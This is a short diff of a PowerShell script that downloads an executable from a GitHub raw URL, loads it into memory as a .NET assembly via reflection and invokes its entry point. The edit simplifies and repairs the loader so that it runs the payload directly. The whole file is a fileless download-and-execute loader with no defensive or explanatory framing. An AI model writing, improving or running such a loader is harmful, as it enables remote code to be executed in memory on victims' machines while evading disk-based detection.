@@ -1,14 +1,11 @@
-$url = " https://raw.githubusercontent.com/mohamedali43/ps1/main/test.exe"
+$url = "https://raw.githubusercontent.com/mohamedali43/ps1/main/test.exe"
 
-$response = Invoke-WebRequest -Uri $url -UseBasicParsing
-$exeBytes = $response.Content
+$bytes = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
 
-$memoryStream = New-Object System.IO.MemoryStream(, [Convert]::FromBase64String($exeBytes))
+$memoryStream = New-Object System.IO.MemoryStream
+$memoryStream.Write($bytes, 0, $bytes.Length)
+$memoryStream.Seek(0, [System.IO.SeekOrigin]::Begin)
 
 $assembly = [System.Reflection.Assembly]::Load($memoryStream.ToArray())
 
-$entryPoint = $assembly.EntryPoint
-
-if ($entryPoint) {
-    $entryPoint.Invoke($null, @([string[]]@()))
-}
+$assembly.EntryPoint.Invoke($null, $null)
